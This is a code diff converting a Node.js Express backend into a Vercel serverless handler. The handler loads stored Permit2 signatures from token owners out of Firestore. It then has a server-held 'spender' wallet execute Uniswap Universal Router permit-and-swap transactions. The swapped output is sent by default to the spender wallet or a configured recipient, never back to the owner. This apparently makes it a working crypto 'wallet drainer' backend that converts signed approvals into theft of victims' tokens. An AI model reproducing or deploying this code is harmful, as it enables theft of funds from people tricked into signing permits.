@@ -1,45 +1,30 @@
-#!/usr/bin/env node
-import dotenv from 'dotenv';
-try { dotenv.config(); } catch(e) {}
-
-import express from 'express';
-import cors from 'cors'; // Added CORS for frontend communication
-import bodyParser from 'body-parser';
 import admin from 'firebase-admin';
 import { ethers } from 'ethers';
 
 // -----------------------------
 // Configuration
 // -----------------------------
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
-const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };
 
 // -----------------------------
-// Globals
+// Lazy Globals (Cached across hot reloads)
 // -----------------------------
-let initialized = false;
 let db = null;
 let provider = null;
 let spenderWallet = null;
 let router = null;
 
-// -----------------------------
-// Init
-// -----------------------------
 async function init() {
-  if (initialized) return;
+  if (db) return; // Already initialized
 
-  const required = ['FIREBASE_PROJECT_ID', 'FIREBASE_CLIENT_EMAIL', 'FIREBASE_PRIVATE_KEY', 'RPC_URL', 'SPENDER_PRIVATE_KEY'];
-  const missing = required.filter(k => !process.env[k]);
-  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));
-
+  // 1. Initialize Firebase
   const serviceAccount = {
     projectId: process.env.FIREBASE_PROJECT_ID,
     clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
+    privateKey: (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, '\n')
   };
 
   if (!admin.apps.length) {
@@ -47,15 +32,14 @@ async function init() {
   }
   db = admin.firestore();
 
+  // 2. Initialize Ethers
   provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
   spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
   router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
-
-  initialized = true;
 }
 
 // -----------------------------
-// Tx Builder
+// Helpers
 // -----------------------------
 function buildSignatureBytes(r, s, vRaw) {
   let v = Number(vRaw);
@@ -66,11 +50,9 @@ function buildSignatureBytes(r, s, vRaw) {
 
 function buildUniversalRouterTx(data, overrides = {}) {
   const { owner, token, amount, deadline, nonce, r, s, v } = data;
-  
-  // Use frontend overrides or env fallbacks
   const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
   const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
-  
+
   const amountBn = BigInt(amount);
   const signatureBytes = buildSignatureBytes(r, s, v);
   const permitAbi = new ethers.AbiCoder();
@@ -91,15 +73,14 @@ function buildUniversalRouterTx(data, overrides = {}) {
     if (hex.length % 2 === 1) hex = '0' + hex;
     return '0x' + hex;
   }
+  
   const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
-
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
     ["bytes", "uint256", "uint256", "address"],
     [path, amountBn, BigInt(0), recipient]
   );
 
-  // Hardcoded command string 0x02 (Permit) + 0x08 (Swap)
   const commands = "0x0208"; 
   const inputs = [permitInput, swapInput];
   const execDeadline = Math.floor(Date.now() / 1000) + 1800;
@@ -108,53 +89,64 @@ function buildUniversalRouterTx(data, overrides = {}) {
 }
 
 // -----------------------------
-// API
+// Vercel Serverless Handler
 // -----------------------------
-const app = express();
-app.use(cors()); // Allow frontend to call this
-app.use(bodyParser.json());
+export default async function handler(req, res) {
+  // 1. Handle CORS
+  res.setHeader('Access-Control-Allow-Credentials', true);
+  res.setHeader('Access-Control-Allow-Origin', '*'); // Allow all origins (or set specific)
+  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+  res.setHeader(
+    'Access-Control-Allow-Headers',
+    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
+  );
 
-app.post('/api/run-worker', async (req, res) => {
+  if (req.method === 'OPTIONS') {
+    res.status(200).end();
+    return;
+  }
+
+  // 2. Only allow POST
+  if (req.method !== 'POST') {
+    return res.status(405).json({ ok: false, error: "Method Not Allowed" });
+  }
+
   try {
     await init();
     
-    // Determine which docs to process
-    let docsToProcess = [];
     const { docId, recipient, outputToken } = req.body;
+    let docsToProcess = [];
 
+    // Strategy: Process 1 specific doc (User clicked button) OR fallback to queue
     if (docId) {
-      // 1. Process specific document (from "Execute" button)
       const docSnap = await db.collection('permit2_signatures').doc(docId).get();
       if (docSnap.exists && !docSnap.data().processed) {
         docsToProcess.push(docSnap);
       }
     } else {
-      // 2. Process pending queue (fallback)
+      // Fallback: Process up to 2 items from queue
       const snaps = await db.collection('permit2_signatures')
         .where('processed', '==', false)
-        .limit(5)
+        .limit(2)
         .get();
       docsToProcess = snaps.docs;
     }
 
     if (docsToProcess.length === 0) {
-      return res.json({ ok: true, processed: 0, message: "No pending docs found" });
+      return res.status(200).json({ ok: true, processed: 0, message: "Nothing to process" });
     }
 
     let processedCount = 0;
-    
-    // Execute Loop
+
     for (const docSnap of docsToProcess) {
       const data = docSnap.data();
-      
       try {
-        // Build Tx with optional overrides from frontend
         const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
         
-        // Estimate Gas
+        // Estimate gas
         const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
         
-        // Execute
+        // Execute Transaction
         const tx = await router.execute(commands, inputs, execDeadline, { 
           value: 0, 
           gasLimit: (gasEstimate * 120n) / 100n 
@@ -166,30 +158,24 @@ app.post('/api/run-worker', async (req, res) => {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
-          adminExecutor: "BACKEND_SERVER"
+          adminExecutor: "VERCEL_BACKEND"
         });
-        
+
         processedCount++;
       } catch (err) {
-        console.error(`Error processing ${docSnap.id}:`, err);
+        console.error(`Failed doc ${docSnap.id}:`, err);
         await docSnap.ref.update({
-          lastError: err.message,
+          lastError: err.message || String(err),
           lastErrorAt: Date.now()
         });
-        // If we are processing a single ID request, throw to notify frontend
-        if (docId) throw err; 
+        if (docId) throw err; // Re-throw if it was a specific manual request
       }
     }
 
-    res.json({ ok: true, processed: processedCount });
+    return res.status(200).json({ ok: true, processed: processedCount });
 
-  } catch (err) {
-    console.error("Server Error:", err);
-    res.status(500).json({ ok: false, error: err.message || String(err) });
+  } catch (error) {
+    console.error("Handler Error:", error);
+    return res.status(500).json({ ok: false, error: error.message });
   }
-});
-
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-  console.log(`Backend listening on port ${port}`);
-});
+}
